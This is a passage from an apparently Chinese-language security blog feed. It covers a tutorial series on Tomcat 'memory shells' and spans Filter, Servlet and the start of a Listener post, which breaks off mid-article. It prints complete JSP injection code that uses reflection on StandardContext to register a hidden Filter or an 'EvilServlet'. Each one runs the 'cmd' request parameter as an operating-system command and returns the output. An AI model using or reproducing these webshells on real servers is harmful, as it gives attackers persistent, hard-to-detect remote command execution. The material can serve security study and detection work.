<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();<span class="comment">//获取servletContext</span></span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取servletContext.context</span></span><br><span class="line">  appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);<span class="comment">//得到applicationContext</span></span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取applicationContext.context</span></span><br><span class="line">  stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);<span class="comment">//得到standardContext</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;leihehe&quot;</span>;<span class="comment">//先设置这个恶意filter的名字</span></span><br><span class="line"><span class="comment">/*获取filterConfigs*/</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);<span class="comment">//获取到filterConfigs =&gt; 一堆filterConfig的集合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;<span class="comment">//判断我们自己设定filter名字的filterConfig是否不存在</span></span><br><span class="line">    		<span class="comment">/* 不存在，开始创建恶意 Filter */</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="comment">//这段代码是shell恶意代码，就不详细解释了</span></span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();<span class="comment">//windows环境下测试</span></span><br><span class="line">                    <span class="comment">//Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个filtermap</span></span><br><span class="line"><span class="comment">         * 设置filter的名字和对应的urlpattern</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将 name 和 filterConfig 作为 key-value进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Windows下测试结果：</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110036049.png" alt="image-20211209110036049"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110230572.png" alt="image-20211209110230572"></p>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>该Filter内存马在服务器重启后会失效(StandardContext在tomcat的生命周期内保存)，且该方法仍需要上传jsp文件才能使用该内存马 - 我们其实可以通过反序列化来实现动态注册filter，在之后的篇章将会涉及。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na">https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na</a></p>
<p><a href="https://blog.csdn.net/lqzkcx3/article/details/79357144">https://blog.csdn.net/lqzkcx3/article/details/79357144</a></p>
<p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Memory Shell</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Memory Shell</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马系列(三):Servlet型</title>
    <url>/2021/12/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%89-Servlet%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在掌握了Listener内存马的实现后，Servlet型内存马的实现也变得很简单。此篇笔记主要讲解了构造Servlet型内存马的流程。</p>
<span id="more"></span>

<h1 id="探究Servlet的创建流程"><a href="#探究Servlet的创建流程" class="headerlink" title="探究Servlet的创建流程"></a>探究Servlet的创建流程</h1><p>同样是创建一个HomeServlet，并将Class的开头与doGet()的地方打上断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134250716.png" alt="image-20211230134250716"></p>
<p>同时在web.xml中添加上</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/home<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行服务器后发现 第一个断点会在访问<code>/home</code>后断下，因此我们断点，servlet是在server收到请求后创建的。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134515772.png" alt="image-20211230134515772"></p>
<p>在<code>StandardWrapper</code>中，loadServlet()方法中创建了一个servlet</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134614746.png" alt="image-20211230134614746"></p>
<p>那么如果我们将<code>this.servletClass</code>改成恶意Servlet，那么恶意Servlet就会被创建。</p>
<h1 id="构造Servlet内存马的创建代码"><a href="#构造Servlet内存马的创建代码" class="headerlink" title="构造Servlet内存马的创建代码"></a>构造Servlet内存马的创建代码</h1><p>现在已经知道要修改StandardWrapper中的servletClass，但要想修改，就得先获取到StandardWrapper对象。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134947343.png" alt="image-20211230134947343"></p>
<p><code>StandardWrapper</code>继承了<code>ServletConfig</code>，而<code>ServletConfig</code>是可以直接被我们所获取得，其保存了当前Servlet的配置信息。</p>
<p>因此我们可以直接在jsp中进行获取。</p>
<p>需要注意的是，jsp中获取到的作用域都是<code>Facade</code>类型(如果直接写成StandardWrapperFacade类型会报错)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135326053.png" alt="image-20211230135326053"></p>
<p>可以发现在构造方法中，StandardWrapper类型的context被赋值给了类属性<code>context</code></p>
<p>因此我们可以用反射的方法来获取到context</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取到standardWrapper后，就可以设置相应的servlet了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135525495.png" alt="image-20211230135525495"></p>
<p>因此完整的注册内存马代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  <span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">  stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line">  stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.http.HttpServlet&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> ((i=inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">      resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">      resp.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapperFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: leihehe</span><br><span class="line">  Date: <span class="number">30</span>/<span class="number">12</span>/<span class="number">2021</span></span><br><span class="line">  Time: 09:<span class="number">22</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.http.HttpServlet&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">      <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">      <span class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">      <span class="keyword">while</span> ((i=inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">  stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line">  stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230140132389.png" alt="image-20211230140132389"></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Memory Shell</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Memory Shell</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马系列(二):Listener型</title>
    <url>/2021/12/29/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%BA%8C-Listener%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Listener型内存马分析起来比Filter型的要简单很多，在监听到请求后自动触发。学习了<strong>JavaWeb</strong>后再来看这些其实都并不难。</p>
<p>此文展示了我在不借助网上的Listener内存马资料下完成Listener内存马构造的过程。</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先创建一个servlet项目。引入Tomcat中的<strong>servlet-api.jar、tomcat-api.jar及catalina.jar</strong></p>
<h1 id="内存马流程分析"><a href="#内存马流程分析" class="headerlink" title="内存马流程分析"></a>内存马流程分析</h1><h2 id="listener类型"><a href="#listener类型" class="headerlink" title="listener类型"></a>listener类型</h2><p>学过servlet的话应该知道，listener分为以下类型：</p>
<ul>
<li>ServletRequestListener - 对每次请求进行监听</li>
<li>ServletContextListener -只会在服务器启动或者关闭时触发</li>
<li>ServletSessionListener - 在创建、销毁session登情况触发。</li>
</ul>
<p>显而易见，我们选择使用ServletRequestListener类型的listener比较合适，因为其可以监听每次request的执行与销毁；</p>
<h2 id="探究listener的注册与执行"><a href="#探究listener的注册与执行" class="headerlink" title="探究listener的注册与执行"></a>探究listener的注册与执行</h2><p>接下来，我们随意创建一个<code>TestListener</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;evil code&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将他加入web.xml</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229151841950.png" alt="image-20211229151841950"></p>
<p>现在来探究一个正常的Listener被执行的流程</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152257919.png" alt="image-20211229152257919"></p>
<p>在Class被创建的地方下个断点，再在代码执行的地方下个断点。</p>
<p>发现了关键的地方 <code>listenerStart()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152439542.png" alt="image-20211229152439542"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152524318.png" alt="image-20211229152524318"></p>
<p>继续跟进<code>findApplicationListeners()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] findApplicationListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.applicationListeners;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由此可见，如果我们修改了<code>StandardContext</code>的<code>applicationListeners</code>属性，就可以让我们自己构造的恶意Listener加载进去。</p>
<p>那么怎么能够获取到<code>StandardContext</code>呢？</p>
<p>这里可能要一些前置知识：<strong>每一个项目都有一个ServletContext, ServletContext是全局共享的，也就是说所有的Servlet都可以访问这一个ServletContext，而ServletContext中往往保存上下文内可以访问的其他servlet的属性</strong></p>
<p>那么<code>StandardContext</code>可能就在<code>ServletContext</code>中，而我们可以通过request来获取到ServletContext。</p>
<p>我们在自己创建的<strong>HomeServlet</strong>中获取ServletContext并下个断点，重新运行看看</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153455331.png" alt="image-20211229153455331"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153607771.png" alt="image-20211229153607771"></p>
<p>获取后发现，servletContext中有一个applicationContext，其中包含了StandardContext，我们可以通过这里获取。</p>
<h1 id="手动注册内存马"><a href="#手动注册内存马" class="headerlink" title="手动注册内存马"></a>手动注册内存马</h1><p>那么我们可以用反射的方式来获取到StandardContext</p>
<p>Tomcat在处理jsp页面的时候，实际上创建一个servlet，并把jsp中的代码翻译生成到该servlet中，因此我们下面的演示直接在自己创建的<code>HomeServlet.java</code>中执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">Field stdFiled=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">aplContext</span> <span class="operator">=</span> (ApplicationContext) stdFiled.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardFld</span> <span class="operator">=</span> aplContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardFld.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardFld.get(aplContext);</span><br></pre></td></tr></table></figure>

<p>接下来我们依然要用反射的方式获取到其<code>applicationListeners</code>属性，并将我们的恶意Listener放在最前面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">applicationEventListeners.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">TestListener</span>());</span><br></pre></td></tr></table></figure>

<p>到这里报错了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229154211578.png" alt="image-20211229154211578"></p>
<p>看起来是add方法出了问题。</p>
<blockquote>
<p>Array内部的ArrayList没有重写AbstractList的add（xxx），导致我们上诉代码调用的add（xxx）其实是直接调用AbstractList类的add（xxx），所以直接抛出了异常UnsupportedOperationException。</p>
</blockquote>
<p>那么直接换成ArrayList即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(applicationEventListeners);</span><br><span class="line">arrayList.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">TestListener</span>());</span><br></pre></td></tr></table></figure>

<p>最后将新建的arrayList重新赋值给<code>applicationEventListeners</code>，恰好有个这样的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.setApplicationEventListeners(arrayList.toArray());</span><br></pre></td></tr></table></figure>

<p><strong>整个注册内存马的过程：</strong></p>
